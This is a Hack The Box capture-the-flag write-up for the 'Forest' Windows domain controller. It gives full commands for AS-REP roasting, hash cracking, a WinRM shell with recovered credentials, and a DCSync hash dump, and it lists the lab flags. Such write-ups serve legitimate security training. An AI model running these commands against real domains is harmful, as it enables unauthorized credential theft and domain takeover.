# HTB: Forest
**Windows – Easy**

---

## Engagement Overview
**Target:** Forest  
**Box IP:** 10.10.10.161  
**Local IP:** 10.10.14.2  
**Date:** 2025-07-15

---

## Objectives
Forest is an “easy” Windows Domain Controller box featuring an Active Directory environment with Exchange installed. The target allows anonymous LDAP binds for domain enumeration. By exploiting Kerberos pre-authentication misconfiguration, a TGT can be obtained and cracked offline. The compromised service account has privileges to modify Exchange group memberships, which can be escalated into full domain compromise using DCSync.

---

## Service Enumeration
```bash
nmap -p- -sC -sV -oA forest-scan 10.10.10.161
```

**Open Ports:**
- 53/tcp   – DNS
- 88/tcp   – Kerberos
- 135/tcp  – MS RPC
- 139/tcp  – NetBIOS
- 389/tcp  – LDAP
- 445/tcp  – SMB
- 464/tcp  – kpasswd
- 593/tcp  – RPC over HTTP
- 636/tcp  – LDAPS
- 3268/tcp – Global Catalog LDAP
- 3269/tcp – Global Catalog LDAPS

**Domain Info:**
- Domain: `htb.local`
- Hostname: `FOREST`
- OS: Windows Server 2016 Standard
- Forest: `htb.local`
- FQDN: `FOREST.htb.local`

**SMB Notes:**
- Message signing enabled and required
- Authentication level: user

---

## Initial Access

### Kerberos Pre-Auth Disabled

**Tool:**  
```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```

**Output:**  
AS-REP roastable hash for user `svc-alfresco`.

### Hash Cracking

**Tool:**  
```bash
hashcat -m 18200 -a 0 hash.txt wordlist.txt
```

**Credentials Recovered:**
- **Username:** `svc-alfresco`
- **Password:** `s3rvice`

### Shell Access

**Command:**
```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

**Result:**  
Authenticated as `svc-alfresco`. Initial foothold established.

---

## Privilege Escalation

### Active Directory Abuse

- `svc-alfresco` is a member of **Account Operators** group.
- Abuse of Exchange permissions (via `WriteDACL`) allows membership modification to privileged Exchange groups.
- Escalated to **Exchange Windows Permissions**, granting `Replicating Directory Changes All`.

### DCSync Attack

**Tool:** `impacket-secretsdump`

**Command:**
```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```

**Result:**  
Successfully dumped NTLM hashes, including `Administrator`.

---

## House Cleaning

- No changes persisted on target.
- All tooling executed in-memory where possible.
- Removed any user-created artifacts.

---

## Post-Exploitation

**Flags Captured:**
- `user.txt`: `58fc66dc0f2af05eb1a1751186720d85`
- `root.txt`: `c0a4c2b3bd3faf59b20d049d108d7613`

**Domain Admin Achieved:** ✅

---

## Tools Utilized

- `nmap`
- `impacket-GetNPUsers`
- `evil-winrm`
- `hashcat`
- `ldapsearch`
- `secretsdump`
- [ropnop/windapsearch](https://github.com/ropnop/windapsearch)
- HTB Official Writeup
- [0xdf Forest Writeup](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)

---

## Key Takeaways

- Kerberos AS-REP Roasting is a critical misconfig to identify during recon.
- LDAP enumeration and group mapping are essential on AD boxes.
- Abusing Exchange and DCSync attacks is a powerful privilege escalation path.
- Windows privesc often requires lateral movement through service accounts and trust delegation, not just binary exploitation.

---
